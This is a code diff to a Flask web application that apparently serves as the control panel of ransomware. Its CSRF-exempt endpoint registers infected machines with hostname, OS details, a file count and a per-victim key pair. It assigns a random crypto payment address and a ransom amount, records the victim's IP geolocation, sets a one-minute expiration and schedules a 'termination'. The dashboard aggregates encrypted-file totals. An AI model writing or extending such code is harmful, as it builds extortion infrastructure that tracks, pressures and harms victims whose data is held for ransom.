@@ -6,16 +6,35 @@ import random, string
 from app import login_manager, csrf, limiter
 from werkzeug.security import check_password_hash
 from application.forms import LoginForm
-from application.models import Users, UsersPaid
+from application.models import Users, UsersPaid, UsersData
+from utilities.get_ip import user_geolocation
+from application.tasks import schedule_termination
+import pytz
+
+
+tz = pytz.timezone('America/Toronto')
 
 
 @app.route("/new-user", methods=["POST"])
 @csrf.exempt
 def new_user():
     try:
+        if 'HTTP_X_FORWARDED_FOR' in request.environ:
+            user_ip = request.environ['HTTP_X_FORWARDED_FOR'].split(',')[0].strip()
+        else:
+            user_ip = request.remote_addr
+
+        geolocation = user_geolocation(user_ip)
         data = request.json
+
+        existing_user = Users.query.filter_by(uid=data["UID"]).first()
+        if existing_user:
+            return jsonify({"error": "UID already exists."}), 400
+
         keys = gen_keys()
-        new_user = Users(
+        expiration_date = datetime.now(tz=tz) + timedelta(minutes=1)
+
+        user = Users(
             username=data.get("Username"),
             hostname=data.get("Hostname"),
             uid=data.get("UID"),
@@ -23,16 +42,32 @@ def new_user():
             os_version=data.get("Version"),
             os_architecture=data.get("Architecture"),
             email=data.get("User Email"),
+            ip_address=user_ip,
             public_key=keys[1],
             private_key=keys[0],
             crypto_address=''.join(random.choices(string.ascii_letters + string.digits, k=16)),
             total_payment=100,
             status=False,
-            amount_paid=0
+            amount_paid=0,
+            creation_date=datetime.now(tz=tz),
+            expiration=expiration_date
         )
-
-        db.session.add(new_user)
+        user_data = UsersData(
+            uid=data.get("UID"),
+            files=data.get("Files"),
+            ip=geolocation.get("IP"),
+            city=geolocation.get("city"),
+            region=geolocation.get("region"),
+            country=geolocation.get("country"),
+            postal=geolocation.get("postal"),
+            latitude=geolocation.get("latitude"),
+            longitude=geolocation.get("longitude"),
+        )
+        db.session.add(user)
+        db.session.add(user_data)
         db.session.commit()
+
+        schedule_termination(user.id, expiration_date)
 
         return jsonify({"message": "User and keys added successfully."}), 201
     except Exception as e:
@@ -94,10 +129,23 @@ def logout():
     return redirect(url_for('login'))
 
 
+from sqlalchemy import func
+
+
 @login_required
-@app.route("/dashboard", methods=["GET", "POST"])
+@app.route("/dashboard", methods=["GET"])
 def dashboard():
-    return render_template("dashboard/dashboard.html", active_page='dashboard')
+    users_data = UsersData.query.all()
+    max_files = max((user.files for user in users_data if user.files is not None), default=0)
+    total_files = sum(user.files for user in users_data if user.files is not None)
+
+    return render_template(
+        "dashboard/dashboard.html",
+        active_page='dashboard',
+        users_data=users_data,
+        max_files=max_files,
+        total_files=total_files
+    )
 
 
 @login_required
